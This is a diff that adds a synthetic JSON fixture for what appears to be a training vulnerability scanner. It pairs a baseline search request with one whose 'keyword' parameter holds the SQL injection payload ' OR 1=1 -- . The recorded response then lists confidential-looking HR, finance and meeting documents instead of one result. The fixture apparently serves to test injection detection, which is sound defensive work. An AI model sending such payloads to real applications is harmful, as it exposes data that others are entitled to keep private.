@@ -1,0 +1,53 @@
+{
+  "schema_version": "1.0",
+  "scan_id": "scan-20260827-sqli-001",
+  "capture_type": "synthetic_fixture",
+  "request": {
+    "method": "GET",
+    "url": "http://192.168.94.128/department_resources.php?dept=marketing&keyword=%27%20OR%201%3D1%20--%20",
+    "path": "/department_resources.php",
+    "headers": {
+      "Host": "192.168.94.128",
+      "User-Agent": "REDRED-Training-Scanner/1.0",
+      "Accept": "text/html",
+      "Cookie": "PHPSESSID=demo-secret-session"
+    },
+    "parameters": {
+      "dept": "marketing",
+      "keyword": "' OR 1=1 -- "
+    },
+    "body": ""
+  },
+  "response": {
+    "status_code": 200,
+    "headers": {
+      "Content-Type": "text/html; charset=UTF-8"
+    },
+    "body": "<!doctype html><html><body><h1>마케팅 자료</h1><table><tr><th>ID</th><th>문서</th></tr><tr><td>101</td><td>2026 캠페인 계획</td></tr><tr><td>102</td><td>고객 세그먼트</td></tr><tr><td>103</td><td>예산 현황</td></tr><tr><td>104</td><td>인사 평가 자료</td></tr><tr><td>105</td><td>재무 결산 자료</td></tr><tr><td>106</td><td>경영 회의록</td></tr></table><p>총 6건</p></body></html>"
+  },
+  "baseline": {
+    "request": {
+      "method": "GET",
+      "url": "http://192.168.94.128/department_resources.php?dept=marketing&keyword=campaign",
+      "path": "/department_resources.php",
+      "headers": {
+        "Host": "192.168.94.128",
+        "User-Agent": "REDRED-Training-Scanner/1.0",
+        "Accept": "text/html",
+        "Cookie": "PHPSESSID=demo-secret-session"
+      },
+      "parameters": {
+        "dept": "marketing",
+        "keyword": "campaign"
+      },
+      "body": ""
+    },
+    "response": {
+      "status_code": 200,
+      "headers": {
+        "Content-Type": "text/html; charset=UTF-8"
+      },
+      "body": "<!doctype html><html><body><h1>마케팅 자료</h1><table><tr><th>ID</th><th>문서</th></tr><tr><td>101</td><td>2026 캠페인 계획</td></tr></table><p>총 1건</p></body></html>"
+    }
+  }
+}
